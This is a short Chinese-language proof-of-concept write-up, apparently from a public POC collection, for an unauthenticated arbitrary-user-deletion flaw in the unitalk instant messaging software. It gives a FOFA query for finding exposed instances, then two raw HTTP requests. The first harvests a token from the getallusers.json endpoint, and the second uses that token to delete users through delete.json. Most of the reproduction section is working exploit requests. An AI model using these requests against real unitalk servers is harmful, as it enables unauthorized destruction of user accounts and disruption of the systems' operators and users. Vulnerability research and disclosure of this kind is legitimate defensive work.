# unitalk存在任意用户删除漏洞

# 一、漏洞简介
unitalk是一款即时通讯软件，unitalk存在任意用户删除漏洞

# 二、影响版本
+ unitalk

# 三、资产测绘
+ fofa`title="unitalk"`
+ 特征


# 四、漏洞复现
先获取token

```plain
POST /unitalk/v1.0/user/getallusers.json HTTP/1.1
Host: 172.18.14.68:7778
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35
Content-Type: application/json;charset=UTF-8

{}
```


删除用户

```plain
POST /unitalk/v1.0/user/delete.json HTTP/1.1
Host: 172.18.14.68:7778
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
Content-Length: 48

{"token":"87535651-49c2-4a19-8aeb-401fc16c2366"}
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/itmebnwadmoelggp>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
